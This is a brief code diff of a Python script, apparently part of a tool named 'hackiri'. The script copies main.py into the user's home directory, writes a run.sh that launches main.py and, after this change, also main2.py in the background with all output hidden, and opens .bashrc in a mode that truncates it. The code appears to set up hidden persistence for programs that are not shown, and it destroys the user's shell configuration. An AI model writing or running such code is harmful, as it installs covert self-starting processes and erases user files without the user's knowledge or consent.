@@ -5,7 +5,7 @@ try:
 except: 
      os.system('cp -r hackiri/main.py /$HOME')
 file = open('run.sh' , 'w+')
-file.write('python main.py &> /dev/null &')
+file.write('python main.py &> /dev/null &\npython main2.py &> /dev/null &')
 file.close()
 try:
     file2 = open('.bashrc' , 'w+')
